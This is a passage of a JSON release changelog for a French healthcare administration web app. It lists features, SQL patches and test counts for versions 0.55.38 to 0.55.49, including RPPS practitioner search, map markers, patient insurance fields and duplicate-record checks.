      { "code": "FE", "txt": "Carte : avertissement 'API ANS bloquée — voir diagnostic' affiché en rouge sur le panneau RPPS quand des filtres sont actifs mais résultats = 0 (lien direct vers /admin/rpps-diagnostic)" },
      { "code": "AI", "txt": "+18 tests Vitest : page édition patient (12 : existe, 6 onglets, imports composants, Promise.all charge, hydrate refs, payload complet save, gestion 1-N adresses, champs onglet adresses, secu, audit, sticky save, helpers Field/Toggle), fix recherche libre (4 : plus de bbox, auto-fit, console log, avertissement panneau), lien depuis fiche (1), test obsolete corrigé (1). Total 1477 tests verts (vs 1459)" }
    ],
    "themes": ["patient", "ui_ux", "fixes"],
    "date": "31 mai 2026",
    "noteFile": "NOTE-VERSION-Alpha-0.55.49.html",
    "sqlFile": null
  },
  {
    "v": "0.55.48",
    "kind": "version",
    "titre": "🔬 Diagnostic API RPPS · IP sortante Vercel + status par endpoint + body brut · Page /admin/rpps-diagnostic pour debug en prod",
    "chantiers": [
      { "code": "BE", "txt": "Nouvel endpoint /api/rpps/diagnostic : lance 4 tests en parallèle (Promise.all) — (1) ANS Practitioner family=DUPONT, (2) ANS PractitionerRole city=Paris, (3) ANS Practitioner identifier RPPS exact, (4) BAN data.gouv.fr pour contrôle. Récupère aussi l'IP sortante via api.ipify.org, et les variables d'environnement Vercel (VERCEL_ENV production/preview/dev, VERCEL_REGION cdg1/iad1/etc, Node version)" },
      { "code": "BE", "txt": "Diagnostic intelligent : 4 codes de résumé — OK (vert : 3/3 endpoints répondent), PARTIAL (ambre : 1-2 sur 3), BLACKLISTED (rouge : ≥ 2 retours 403 → l'IP est blacklistée par l'ANS), DOWN (rouge : 0 endpoint OK). Messages explicatifs avec IP affichée. Timeout 10s par requête, AbortController, body tronqué à 800 chars" },
      { "code": "FE", "txt": "Page /admin/rpps-diagnostic : UI complète avec relancer + champ query custom (ex 'Martin'). Affiche en gros : IP sortante (mono violet), hébergeur (Vercel/local), environnement, région Vercel, Node version, durée totale. Bandeau résumé coloré selon diagnostic" },
      { "code": "FE", "txt": "Card par test avec : label, badge status HTTP (vert ok / rouge 403 / ambre autre), durée ms, URL appelée, total FHIR + entries si JSON valide, error message si exception. Détails dépliables : body brut tronqué dans pre dark + headers de réponse (10 premiers)" },
      { "code": "FE", "txt": "Pédagogie intégrée : panneau jaune en bas explique comment lire les codes HTTP (200/403/0/400/500), et 3 solutions si blacklist — (1) Demander whitelist à l'ANS via cyber@esante.gouv.fr avec l'IP affichée, (2) Utiliser un proxy/relay (Cloudflare Workers), (3) Importer le dump RPPS open data depuis data.gouv.fr (mensuel, 1,7M praticiens)" },
      { "code": "FE", "txt": "Entrée menu Administration ajoutée : '🩺 Diagnostic API RPPS' juste après 'Performance SQL'" },
      { "code": "AI", "txt": "+21 tests Vitest : endpoint route (10 : exists, 4 tests parallel, ipify, env Vercel, timeout, body tronqué, 3 codes summary, query custom, no-store), page UI (10 : exists, useEffect mount, bouton + custom, IP en évidence, région, TestCard, pédagogie, 3 solutions, couleur summary), menu (1). Total 1459 tests verts (vs 1438)" }
    ],
    "themes": ["users", "fixes"],
    "date": "31 mai 2026",
    "noteFile": "NOTE-VERSION-Alpha-0.55.48.html",
    "sqlFile": null
  },
  {
    "v": "0.55.47",
    "kind": "version",
    "titre": "🗺 Carte : icônes voyantes mes étab + boutons appel/GPS/email/fiche · Recherche libre (orthopédiste, pharmacie, ville…) en parallèle RPPS+SIRENE+FINESS · Type étab verrouillé après création",
    "chantiers": [
      { "code": "FE", "txt": "Page /etablissement/fiche : le type d'établissement (Mon collectivité / Partenaire) est maintenant VERROUILLÉ après création. Boutons remplacés par divs non-clickables avec opacity 0.55 + badge ambré '🔒 Verrouillé après création' + tooltip 'Le type d'établissement ne peut pas être modifié après création'. Bandeau info en bas : 'Pour changer, il faut supprimer puis recréer'. Côté backend : est_partenaire RETIRÉ du payload update — impossible de switcher accidentellement, même via DevTools" },
      { "code": "FE", "txt": "Carte : icône VOYANTE pour mes établissements. Taille 48px (vs 38 pour partenaires), gradient bleu→vert (#185FA5→#5aa05a au lieu du bleu sombre), halo pulsant (animation pulse-mine 2s ease-out infinite, ring blanc 2px, box-shadow étendu rgba verte). Badge popup change : '★ Mon étab' (au lieu de 'Géré') sur fond vert dff5e0" },
      { "code": "FE", "txt": "Popups étab carte enrichis avec 4 boutons d'action en pied (border-top séparateur) : 📞 Appeler (tel: nettoyé des espaces et points) en bleu si téléphone présent, 📍 Itinéraire (google.com/maps/dir/?api=1&destination=lat,lng) en ambre toujours présent, ✉️ Email (mailto:) en vert si email présent, 📄 Fiche (lien vers /etablissement/fiche?id=X pour mine ou /etablissements-partenaires?id=X pour partner) en violet" },
      { "code": "FE", "txt": "Carte : nouvelle barre de RECHERCHE LIBRE en haut du panneau filtres. Tape n'importe quoi : 'orthopédiste', 'boulangerie', 'pharmacie de Mayrinhac', 'Paris'. Debounce 600ms. Cherche en parallèle (Promise.allSettled) dans 3 sources : /api/rpps (praticiens, max 60), /api/sirene (entreprises, max 40), /api/finess (établissements santé, max 40). Géocode les résultats sans coords via BAN, filtre par bbox visible" },
      { "code": "FE", "txt": "Marqueurs recherche libre colorés par source : RPPS violet 🩺, SIRENE vert 🏪, FINESS bleu 🏥. Popup avec boutons actions identiques. Layer Leaflet dédié freeSearchLayerRef pour pouvoir clear/redraw indépendamment. Reverse géocodage BAN du centre de carte pour cibler la recherche sur la zone visible" },
      { "code": "FE", "txt": "Compteur résultats live : badge violet 'X résultats' à droite du label. Bouton × pour clear la recherche. Min 3 caractères avant de chercher (sinon clear). Console logs détaillés [Recherche libre] avec les comptes par source" },
      { "code": "AI", "txt": "+24 tests Vitest : type étab verrouillé (4), icône voyante mine (4), boutons popup (4), recherche libre state/funcs/UI (11), debug logs (1). Total 1438 tests verts (vs 1414)" }
    ],
    "themes": ["ui_ux", "fixes", "search"],
    "date": "31 mai 2026",
    "noteFile": "NOTE-VERSION-Alpha-0.55.47.html",
    "sqlFile": null
  },
  {
    "v": "0.55.46",
    "kind": "version",
    "titre": "🏥 Refonte fiche patient niveau bulletin de situation · Tables caisses + mutuelles (seed 100+) · Adresses livraison séparées · Nouveau menu Outils scan (QR/code-barre/OCR) · Page placeholder bulletin de situation",
    "chantiers": [
      { "code": "SQL", "txt": "Patch 0.55.46 : nouvelle table caisses_assurance_maladie (code_organisme unique, type CPAM/MSA/CGSS/CSSM, regime, departement, region, adresse, ville). Seed 105 lignes : 96 CPAM métropole + 5 CGSS/CSSM DROM + régimes spéciaux (CNMSS militaires, LMG fonctionnaires, CAMIEG, CAVIMAC, MNH, MSA agricole)" },
      { "code": "SQL", "txt": "Nouvelle table mutuelles (numero_amc 8 chiffres unique, raison_sociale, type 'mutuelle'/'assurance'/'IP', categorie, gere_c2s pour Complémentaire Santé Solidaire). Seed 44 mutuelles principales : Harmonie, MGEN, Malakoff Humanis, AG2R, Mutuelle Générale, AÉSIO, Pro BTP, Mutex, MGEFI, MGP, UNEO, etc. avec leurs n° AMC connus publiquement" },
      { "code": "SQL", "txt": "Nouvelle table patients_adresses_livraison (1-N par patient) : libelle ('Domicile', 'Travail', 'Maison campagne'), destinataire (si différent), adresse complète, code_porte digicode, instructions de livraison ('Sonner 2x', 'Au fond de la cour'), est_principale. RLS via membres_structure" },
      { "code": "SQL", "txt": "20+ colonnes ajoutées sur table patients (idempotent via ADD COLUMN IF NOT EXISTS) : Identité (nom_naissance, sexe, lieu_naissance_ville/code_insee/pays, nationalite). Sécu (numero_secu NIR, caisse_id FK, code_organisme_rattachement, centre_paiement, regime_secu, qualite_assure, rang_naissance, date_debut/fin_droits, ald, ald_commentaire, cmu_c, c2s, ame). Mutuelle (mutuelle_id FK, mutuelle_numero_amc, mutuelle_numero_adherent, mutuelle_date_debut/fin_droits, tiers_payant_actif). Adresse (adresse, complement, code_postal, ville, pays). Contact (telephone_fixe, telephone_portable, email). Urgence (contact_urgence_nom/prenom/lien/telephone, personne_confiance_*). Médecin traitant (medecin_traitant_prenom/telephone/rpps/finess). Audit (source_creation, bs_file_url, bs_ocr_brut, bs_ocr_date, updated_at via trigger)" },
      { "code": "SQL", "txt": "2 RPCs : search_caisses(p_query, p_dept, p_limit) et search_mutuelles(p_query, p_limit). Indexées + tolérantes à la casse. Visible par tous les authentifiés (référentiel public)" },
      { "code": "BE", "txt": "Routes API /api/caisses (params q/dept/code) et /api/mutuelles (params q/amc). Proxy léger via Supabase RPC. Retournent {ok, count, results}" },
      { "code": "FE", "txt": "Nouveaux composants autocomplete CaisseSearch et MutuelleSearch (style FinessSearch). Recherche live 300ms. CaisseSearch a un champ dept à côté + détection 9 chiffres = code organisme. MutuelleSearch détecte 8 chiffres = n° AMC, badges type (mutuelle vert / assurance bleu / IP violet) + badge C2S si gestionnaire" },
      { "code": "FE", "txt": "Nouvelle catégorie de menu 'Outils scan' en 2ème position (juste après Mon espace, donc tout en haut). 4 entrées : 'Créer patient depuis bulletin' (file-scan vert), 'Scan QR code' (qrcode bleu), 'Scan code-barre' (barcode violet), 'OCR générique' (text-recognition ambre)" },
      { "code": "FE", "txt": "Page placeholder /scan/bulletin-situation : explique le workflow (4 étapes), compteurs des référentiels disponibles (caisses, mutuelles, FINESS 540k+, RPPS 1,7M), stack technique prévue (Tesseract.js ou Claude Vision pour OCR, regex extraction NIR/AMC, archivage Supabase bucket). L'OCR complet arrive en 0.55.47" },
      { "code": "AI", "txt": "+26 tests Vitest : tables (4), seed contenu (3), colonnes patient (6), adresses livraison (3), composants UI (2), APIs (2), menu (1), page placeholder (2), formats n° AMC/code (2), divers (1). Total 1414 tests verts (vs 1388)" }
    ],
    "themes": ["patient", "users", "ui_ux"],
    "date": "31 mai 2026",
    "noteFile": "NOTE-VERSION-Alpha-0.55.46.html",
    "sqlFile": "aveho-PATCH-vers-0.55.46.sql"
  },
  {
    "v": "0.55.45",
    "kind": "version",
    "titre": "🔍 Refonte recherche RPPS : multi-critères en parallèle (nom OU ville) · API audit + debug · /partenaires-rpps en autocomplete · Carte RPPS améliorée (reverse géocodage + limites)",
    "chantiers": [
      { "code": "BE", "txt": "Audit API ANS FHIR : depuis le sandbox dev → 403 Forbidden (IP probablement blacklistée). En production sur Vercel, l'IP française devrait passer. L'API ANS distingue strictement family/given/city/postalcode — taper 'Paris' en family= retourne forcément 0 (personne ne s'appelle Paris en famille)" },
      { "code": "BE", "txt": "Refonte complète /api/rpps : recherche INTELLIGENTE en PARALLÈLE. Si l'user tape 'Paris' → 2 requêtes simultanées via Promise.all : (1) Practitioner?name=Paris (au cas où nom propre), (2) PractitionerRole avec location.address-city=Paris + _include practitioner. Merge des Practitioners + dédup par RPPS+adresse" },
      { "code": "BE", "txt": "Limite par défaut remontée de 20 → 50 et max passe de 100 → 200 pour éviter de brider. Helper fetchFhir() avec timeout 12s + AbortController + User-Agent 'Aveho-EC/0.55' + headers complets" },
      { "code": "BE", "txt": "Messages d'erreur enrichis : si 403 → 'API ANS bloquée (403 Forbidden) — vérifier IP en production'. Si timeout → 'API ANS indisponible (HTTP timeout)'. Champs debug ajoutés à la réponse : duration_ms, queries_count, success_count, error_count, pracs_found, roles_found" },
      { "code": "BE", "txt": "Gestion des PractitionerRole multiples : un même praticien peut avoir plusieurs adresses (cabinets multiples). On crée maintenant une entrée par rôle pour les afficher tous, puis dédup par RPPS+cp+commune" },
      { "code": "FE", "txt": "RppsAutocomplete : limite remontée de 10 → 50, messages d'erreur affichés dans le dropdown (au lieu de just résultats vides). Si l'API ANS répond mais 0 résultat → message clair. Si l'API échoue → l'erreur s'affiche" },
      { "code": "FE", "txt": "Page /partenaires-rpps refondue : remplacement complet de RppsSearch (avec bouton 'Rechercher' bloquant) par RppsAutocomplete (live au fur et à mesure de la frappe). Astuce affichée dans la modale : 'tape un nom OU une ville'. Le bouton Rechercher est SUPPRIMÉ" },
      { "code": "FE", "txt": "Carte RPPS : reverse géocodage BAN INSEE pour trouver le nom de la ville au centre de la carte → utilisé comme critère 'ville' dans l'appel /api/rpps. Cache par tile (lat.toFixed(2) + lng.toFixed(2)) en localStorage" },
      { "code": "FE", "txt": "Carte RPPS : limite remontée de 30 → 100 par profession. Console logs détaillés pour debug : '[Carte RPPS] Médecin → 47 résultats', '[Carte RPPS] résultats finaux 23 / total fetchés 94' (utile pour comprendre pourquoi 0 sur la carte)" },
      { "code": "AI", "txt": "+15 tests Vitest : détection capitale (2), limites (1), dédup par RPPS+adresse (1), messages erreur 403/timeout (2), min 2 chars autocomplete (3), carte RPPS (3), page /partenaires-rpps utilise autocomplete (1), headers UA (1), parallel Promise.all (1). Total 1388 tests verts (vs 1373)" }
    ],
    "themes": ["users", "fixes", "ui_ux"],
    "date": "31 mai 2026",
    "noteFile": "NOTE-VERSION-Alpha-0.55.45.html",
    "sqlFile": null
  },
  {
    "v": "0.55.44",
    "kind": "hotfix",
    "titre": "🩹 Fix SQL 'column rpps does not exist' · Colonne rpps + adeli + profession + specialite ajoutées sur etablissements_partenaires AVANT les index",
    "chantiers": [
      { "code": "FIX", "txt": "Bug SQL 'ERROR 42703: column rpps does not exist' lors de l'exécution du patch 0.55.43 : la table etablissements_partenaires n'avait pas encore de colonne rpps mais le patch tentait de créer un index dessus. Ordre des instructions incorrect" },
      { "code": "SQL", "txt": "Patch 0.55.44 : ALTER TABLE etablissements_partenaires ADD COLUMN IF NOT EXISTS rpps text, adeli text, profession text, specialite text (toutes idempotentes). Puis recrée les 3 colonnes traçabilité doublon. PUIS les 5 index. PUIS la RPC check_etab_doublon. PUIS la vue v_doublons_forces. Tout dans le bon ordre" },
      { "code": "SQL", "txt": "Le patch 0.55.43 a été corrigé aussi (ajout colonnes rpps en première instruction) pour quiconque le rejouerait. Hotfix 100% idempotent — peut être rejoué même si 0.55.43 a partiellement échoué" },
      { "code": "AI", "txt": "+6 tests Vitest : colonne rpps ajoutée, ordre col avant index, autres colonnes RPPS, patch 0.55.43 corrigé, idempotence (IF NOT EXISTS partout), RPC recréée. Total 1373 tests verts (vs 1367)" }
    ],
    "themes": ["fixes", "rls_securite"],
    "date": "31 mai 2026",
    "noteFile": "NOTE-HOTFIX-Alpha-0.55.44.html",
    "sqlFile": "aveho-PATCH-vers-0.55.44.sql"
  },
  {
    "v": "0.55.43",
    "kind": "version",
    "titre": "🛡 Système anti-doublon réutilisable · RPC check_etab_doublon · Composant DoublonAlert + EtabAutoFiller · Nouveau droit force_doublon_etab · Commentaire obligatoire avec traçabilité",
    "chantiers": [
      { "code": "SQL", "txt": "Patch 0.55.43 : 3 nouvelles colonnes sur etablissements ET etablissements_partenaires : doublon_force_commentaire (texte), doublon_force_par (uuid → auth.users), doublon_force_at (timestamptz). Index sur finess/siret/rpps pour lookup rapide. Tout en IF NOT EXISTS / ADD COLUMN IF NOT EXISTS donc idempotent" },
      { "code": "SQL", "txt": "Nouvelle RPC check_etab_doublon(p_finess, p_siret, p_siren, p_rpps, p_nom, p_exclude_id) qui scanne mes étab ET les partenaires de la structure courante, matche sur n'importe lequel des identifiants, retourne jsonb { ok, found, count, matches[] } avec pour chaque match : kind (mine/partner), id, nom, type, adresse, identifiants matchés, et l'éventuel commentaire de force précédent" },
      { "code": "SQL", "txt": "Vue v_doublons_forces qui liste tous les doublons forcés (mine + partner) avec leur commentaire et auteur — pour audit admin. security_invoker pour respecter RLS" },
      { "code": "FE", "txt": "Nouveau composant /app/components/DoublonAlert.js : encart ambre avec icône triangle ⚠, liste des fiches existantes avec badge 'Mon étab'/'Partenaire', adresse complète, identifiants matchés mis en évidence, lien direct vers chaque fiche. Si commentaire de force précédent → affiché en italique. 2 actions : Annuler la création / Créer quand même (avec commentaire)" },
      { "code": "FE", "txt": "DoublonAlert : si admin (droit force_doublon_etab) → bouton 'Créer quand même' qui ouvre un textarea obligatoire ≥ 10 caractères. Si pas admin → message 'Seul un admin peut forcer la création d'un doublon. Contactez votre référent.' Validation côté UI puis enregistrement en base avec qui/quand/pourquoi" },
      { "code": "FE", "txt": "Nouveau composant /app/components/EtabAutoFiller.js : regroupe FinessSearch + SireneSearch + RppsAutocomplete dans un seul bloc compact réutilisable. Props : show=['finess','sirene','rpps'] pour filtrer les sources actives, callbacks onSelect séparés. Mode compact (sans titre) ou bloc violet (avec)" },
      { "code": "FE", "txt": "Helper /app/lib/checkEtabDoublon.js : wrapper autour de la RPC qui retourne format normalisé. Try/catch pour gérer erreurs. Pas de check si aucun critère fourni (return early avec found:false)" },
      { "code": "FE", "txt": "Intégration dans /etablissements-partenaires (modale création) : DoublonAlert affiché si check trouve un match. State doublons + doublonForceCommentaire. Save() vérifie d'abord les doublons, si trouvé bloque et affiche l'alerte. Si admin force avec commentaire → enregistre doublon_force_commentaire + doublon_force_par + doublon_force_at" },
      { "code": "FE", "txt": "Intégration dans /etablissements (création depuis FINESS/SIRENE) : remplace l'ancien check 'simple' qui ne regardait que les FINESS de mes étab. Désormais utilise checkEtabDoublon qui scanne aussi les partenaires + matche sur siret/siren/nom. Bloque la création tant que pas confirmé" },
      { "code": "BE", "txt": "Nouveau droit dans lib/useAuth.js : 'force_doublon_etab' avec format objet { module: 'doublons', perm: 'write' } pour ne matcher QUE ce module précis (pas les autres modules write). canDo() étendu pour supporter ce format ciblé en plus du format string existant" },
      { "code": "FE", "txt": "Nouveau module 'doublons' dans la liste MODULES de la page /utilisateurs : permission 'write' = peut forcer la création d'un doublon avec commentaire. Visible dans la modale d'édition de rôle, à activer pour les administrateurs qui ont vraiment besoin de cette possibilité" },
      { "code": "AI", "txt": "+18 tests Vitest : canDo() ciblée par module (6 — admin, lecture, doublons.write, doublons.read insuffisant, etablissement.write ne déborde pas, wildcard), helper checkEtabDoublon (3 — pas de check sans critère, appel RPC, gestion erreur), validation commentaire (3 — short/long/trim), SQL contient les colonnes et RPC (3), EtabAutoFiller (2), module doublons (1). Total 1367 tests verts (vs 1349)" }
    ],
    "themes": ["users", "rls_securite", "patient"],
    "date": "31 mai 2026",
    "noteFile": "NOTE-VERSION-Alpha-0.55.43.html",
    "sqlFile": "aveho-PATCH-vers-0.55.43.sql"
  },
  {
    "v": "0.55.42",
    "kind": "version",
    "titre": "🩺 Composant RppsAutocomplete style FinessSearch/SireneSearch · Dropdown live au fur et à mesure de la frappe · Photo Google au survol · Boutons Appeler/Mail/GPS sur chaque résultat · Intégré dans création partenaire (3ème ligne)",
    "chantiers": [
      { "code": "FE", "txt": "Nouveau composant /app/RppsAutocomplete.js (style FinessSearch.js et SireneSearch.js) : 1 seul input avec selecteur profession compact à gauche, dropdown live au fur et à mesure de la frappe avec debounce 350ms, fermeture au clic extérieur. Recherche min 2 caractères (ou profession active). Détection auto numéro RPPS (11 chiffres) → recherche exacte" },
      { "code": "FE", "txt": "Tuiles dropdown enrichies : avatar 38x38 avec photo Google au survol (sinon gradient bleu/teal), nom + civilité + badge profession, spécialité avec icône prescription, adresse complète avec map-pin, RPPS/ADELI mono en footer. Hover light gris (#f4f7fa)" },
      { "code": "FE", "txt": "Photo Google au survol : useEffect au mouseEnter qui appelle /api/place avec nom+adresse complete. Mémoïzation par RPPS (jamais re-fetch). Si pas de clé Google ou pas de photo trouvée → fallback gradient sans casser le rendu. Cache localStorage 7j par requête" },
      { "code": "FE", "txt": "Boutons ContactActions (Appeler tel:, Mail mailto:, GPS popup choix Maps/Apple/Waze/OSM/Copier) intégrés sur chaque résultat — visibles tout le temps, pas seulement au survol. Cliquables sans déclencher la sélection (stopPropagation)" },
      { "code": "FE", "txt": "9 professions dans le select compact : Toutes / Médecin / Infirmier / Kinésithérapeute / Pharmacien / Sage-femme / Dentiste / Pédicure / Orthophoniste. Changement de profession → relance la recherche live" },
      { "code": "FE", "txt": "Intégration dans /etablissements-partenaires modale création : 3ème ligne 🩺 RPPS (en plus de 🏥 FINESS et 🏢 SIRENE). Sélection d'un praticien → pré-remplit nom (avec civilité), type (Cabinet médical si médecin sinon profession), type_relation (Prescripteur par défaut), adresse, cp, ville, téléphone, email. Garde l'existant si déjà rempli (form.nom || ...)" },
      { "code": "AI", "txt": "+13 tests Vitest : logique search (4), construction params API (3), hover Google photo (3), intégration création partenaire (2), 9 professions (1). Total 1349 tests verts (vs 1336)" }
    ],
    "themes": ["users", "ui_ux"],
    "date": "31 mai 2026",
    "noteFile": "NOTE-VERSION-Alpha-0.55.42.html",
    "sqlFile": null
  },
  {
    "v": "0.55.41",
    "kind": "hotfix",
    "titre": "🩹 Fix géoloc bloquée sur ancienne position (cache 24h) · Fix filtres carte RPPS/SIRENE vides (géocodage BAN INSEE) · Bouton 'Recentrer' fresh · Indicateur précision + heure de maj",
    "chantiers": [
      { "code": "FIX", "txt": "Bug géoloc bloquée sur Lagny au lieu de Mayrinhac (vraie ville) : le code lisait toujours localStorage avec un TTL de 24h. Désormais le bouton 'Ma position' force TOUJOURS un nouvel appel getCurrentPosition avec maximumAge: 0 (jamais de cache) et enableHighAccuracy: true (utilise le GPS si dispo au lieu de la triangulation IP)" },
      { "code": "FIX", "txt": "Timeout porté de 8s à 15s pour laisser le GPS faire son fix (sur PC fixe sans GPS, ça utilise la triangulation Wi-Fi qui peut prendre plus de temps). Messages d'erreur enrichis : si code 1 (refus) → instructions navigateur précises (Chrome cadenas, Edge permissions, mobile paramètres). Si code 3 (timeout) → vérifier Windows Paramètres → Confidentialité → Localisation" },
      { "code": "FE", "txt": "Nouvel indicateur visuel sous le bouton 'Ma position' : '±50m · maj à l'instant' avec couleur verte si précision GPS (<1km) ou rouge si précision IP (>1km). Helper formatRelativeTime() pour l'affichage (à l'instant / il y a X min / X h / X j). États geolocLoading, lastGeolocAt, geolocAccuracy" },
      { "code": "FIX", "txt": "Bug filtres carte RPPS et SIRENE : 0 résultat affiché parce que l'API FHIR ANS ne renvoie pas de lat/lng et l'API SIRENE ne les renvoie pas systématiquement. Solution : nouvelle fonction geocodeBatch() qui géocode chaque résultat via l'API BAN INSEE (api-adresse.data.gouv.fr/search) à partir de l'adresse complète (adresse + cp + commune). Cache localStorage par query pour éviter les requêtes répétées" },
      { "code": "FE", "txt": "API SIRENE proxy /api/sirene supporte maintenant les params lat/lng/radius=50km pour recherche par proximité géographique (recentre les résultats sur la zone visible). Avant : recherche nationale qui filtrait après → ratio résultats / bbox catastrophique. Désormais : recherche localisée → la plupart des résultats sont dans la bbox" },
      { "code": "FE", "txt": "Hints UI ambres si 0 résultat sur RPPS ou SIRENE : 'Aucun praticien trouvé dans la zone visible. Zoome plus large ou déplace la carte vers une grande ville.' Évite la confusion 'pourquoi rien ne s'affiche ?'" },
      { "code": "AI", "txt": "+17 tests Vitest : options géoloc (2), formatRelativeTime (5), geocodeBatch logique (3), URL BAN INSEE (1), params SIRENE (1), filtre bbox post-géocodage (3), avertissement précision (2). Total 1336 tests verts (vs 1319)" }
    ],
    "themes": ["fixes", "ui_ux"],
    "date": "31 mai 2026",
    "noteFile": "NOTE-HOTFIX-Alpha-0.55.41.html",
    "sqlFile": null
  },
  {
    "v": "0.55.40",
    "kind": "hotfix",
    "titre": "🩹 Fix SQL 42P17 'functions in index expression must be marked IMMUTABLE' · date_trunc() retiré de l'index · Les 2 autres index suffisent pour la perf",
    "chantiers": [
      { "code": "FIX", "txt": "Bug SQL 'ERROR 42P17: functions in index expression must be marked IMMUTABLE' lors de l'exécution du patch 0.55.39 : l'index idx_api_usage_month utilisait date_trunc('month', created_at) qui n'est pas marqué IMMUTABLE en PostgreSQL (car le fuseau horaire peut influencer le résultat avec timestamptz). PostgreSQL refuse les fonctions non-IMMUTABLE dans les expressions d'index" },
      { "code": "SQL", "txt": "Patch 0.55.40 : drop index if exists idx_api_usage_month (silencieux si jamais créé), garde les 2 autres index utiles (idx_api_usage_api sur api_name+created_at desc et idx_api_usage_struct sur structure_id+created_at). PostgreSQL utilise un range scan sur created_at desc pour le filtre 'where created_at >= date_trunc month' donc les perfs restent identiques" },
      { "code": "SQL", "txt": "Patch 0.55.40 100% idempotent et auto-suffisant : recrée la table api_usage_log (IF NOT EXISTS), les RLS policies (do $$ if exists $$), la vue v_api_usage_current_month, les 3 RPCs (get_api_usage_stats, log_api_call, cleanup_old_api_logs). Tu peux jouer ce patch même si le 0.55.39 a partiellement échoué" },
      { "code": "SQL", "txt": "Le patch 0.55.39 a été corrigé aussi (l'index sur date_trunc supprimé) pour quiconque le rejouerait. Note ajoutée en commentaire expliquant pourquoi" },
      { "code": "AI", "txt": "+6 tests Vitest : vérification que les fichiers SQL ne contiennent plus date_trunc dans les CREATE INDEX, drop explicite de l'ancien, 2 autres index conservés, idempotence (IF NOT EXISTS), DO $$ pour policies. Total 1319 tests verts (vs 1313)" }
    ],
    "themes": ["fixes", "rls_securite"],
    "date": "31 mai 2026",
    "noteFile": "NOTE-HOTFIX-Alpha-0.55.40.html",
    "sqlFile": "aveho-PATCH-vers-0.55.40.sql"
  },
  {
    "v": "0.55.39",
    "kind": "version",
    "titre": "🔌 Compteur de requêtes API + page Paramètres > Intégrations · .env.local avec clé Google Places · Login info biométrie · SQL log_api_call + get_api_usage_stats",
    "chantiers": [
      { "code": "SQL", "txt": "Patch 0.55.39 : table api_usage_log (id, structure_id, user_id, api_name, endpoint, status [ok/error/no_key/cache_hit], http_status, error_message, duration_ms, created_at). Index sur api_name + date_trunc('month') pour les agrégats rapides. Vue v_api_usage_current_month qui groupe par api_name avec calls_ok/error/cached/total + avg_duration_ms. RPCs : get_api_usage_stats() (admin), log_api_call() (utilisé par les route handlers), cleanup_old_api_logs() (nettoie > 90 jours). RLS : insert pour tous authentifiés, select uniquement pour parametres_admin" },
      { "code": "BE", "txt": "Modification de /api/place : logger chaque appel via la RPC log_api_call avec endpoint (findplacefromtext / details / no_key / exception), status, duration_ms. Best-effort try/catch — n'a JAMAIS d'impact sur la réponse à l'utilisateur même si Supabase down" },
      { "code": "FE", "txt": "Nouvelle page /parametres/integrations : 5 cartes (Google Places, RPPS, FINESS, SIRENE, BAN INSEE) avec pour chacune : statut connecté/non configuré (badge vert/rouge), total des appels du mois, succès/erreurs, temps moyen, barre de quota (Google Places : 1000/mois gratuits, ~$17/1000 ensuite, autres APIs gratuites). Auto-detect si la clé Google Places est configurée côté serveur" },
      { "code": "FE", "txt": "Pour les APIs nécessitant une clé non configurée (Google Places) : bloc informatif ambre avec procédure étape par étape (lien doc, ajout sur Vercel Settings → Environment Variables, redeploy). Lien direct vers la documentation officielle de chaque API" },
      { "code": "CFG", "txt": "Fichier .env.local créé (dans .gitignore — JAMAIS poussé sur GitHub) avec GOOGLE_PLACES_API_KEY. ⚠ La clé partagée dans le chat est COMPROMISE — à régénérer absolument sur Google Cloud Console + restreindre par référent HTTP. Fichier .env.local.example mis à jour avec la procédure complète" },
      { "code": "FE", "txt": "TopBar : nouveau lien 'Intégrations API' (icône ti-plug bleu Google) dans le menu admin, juste après 'Paramètres'. Accès restreint via parametres_admin" },
      { "code": "FE", "txt": "Login : message d'astuce 'Active la biométrie dans Mon profil' qui s'affiche dès qu'un email est saisi ET que WebAuthn est supporté ET que pas de méthode biométrique enregistrée pour cet email. Aide à comprendre pourquoi les boutons biométriques ne s'affichent pas" },
      { "code": "AI", "txt": "+14 tests Vitest : .env.local + .gitignore (2), schéma SQL (2), page intégrations 5 APIs (3), calcul coût (4), login biométrie hint (2), logging best-effort (1). Total 1313 tests verts (vs 1299)" }
    ],
    "themes": ["users", "ui_ux", "rls_securite"],
    "date": "31 mai 2026",
    "noteFile": "NOTE-VERSION-Alpha-0.55.39.html",
    "sqlFile": "aveho-PATCH-vers-0.55.39.sql"
  },
  {
    "v": "0.55.38",
    "kind": "version",
    "titre": "🗺 Filtres carte RPPS + SIRENE croisés (en plus de FINESS) · Wikipedia retiré · Google Places API préparé (photo + horaires + étoiles + avis) · Popup d'alerte 20s · SQL préférences alertes Google par étab · Modal avec étoiles de notation",
    "chantiers": [
      { "code": "FE", "txt": "EtabPhoto Wikipedia COMPLÈTEMENT RETIRÉ : les photos ne correspondaient pas à l'adresse (Wikipedia matche le premier hit textuel sans vérifier la géoloc). Remplacé par un système basé sur Google Places API qui interroge par 'nom + adresse complète' garantissant que la photo correspond vraiment à l'endroit" },
      { "code": "FE", "txt": "Nouveau composant EtabPhoto.js qui appelle /api/place (proxy serveur). Si GOOGLE_PLACES_API_KEY définie côté serveur (dans .env Vercel) → photo Google + note + nb d'avis + horaires. Sinon → fallback gradient propre selon le type. Cache localStorage 7 jours" },
      { "code": "BE", "txt": "Nouveau route handler /api/place qui proxifie Google Places API (sécurise la clé côté serveur). 2 appels : findplacefromtext pour récupérer le place_id, puis details pour les fields (photos, rating, user_ratings_total, opening_hours, formatted_phone_number, website, url, name, formatted_address). Cache Next.js 24h" },
      { "code": "FE", "txt": "Nouveau composant EtabGoogleDetails.js : affiche dans une modale les détails Google d'un établissement — étoiles de notation visuelles (★★★★⯨ avec demi-étoile), nombre d'avis, statut Ouvert maintenant/Fermé, horaires d'ouverture par jour, téléphone/site/lien Google Maps avec icônes. Bouton 'Voir les avis Google' qui ouvre la page Google Maps de l'établissement" },
      { "code": "SQL", "txt": "Patch 0.55.38 : table user_review_alert_prefs (préférences alertes commentaires Google par utilisateur ET par établissement, avec min_rating/max_rating pour filtrer ex: 'alerte si avis ≤ 2 étoiles'). Table google_reviews_seen (historique pour ne pas re-notifier le même avis). RPCs get_my_review_alert_prefs() et set_review_alert_pref(). RLS activées" },
      { "code": "FE", "txt": "Composant AlertToast.js avec API globale showAlert() : popup en bas à droite qui disparaît automatiquement après 20s. Supporte alertes multiples empilées. Barre de progression du timer animée en bas. Couleur selon rating (vert ≥4★, ambre 3★, rouge ≤2★). Click sur l'alerte → action custom (redirection vers la fiche etab). AlertToastContainer monté dans layout.js" },
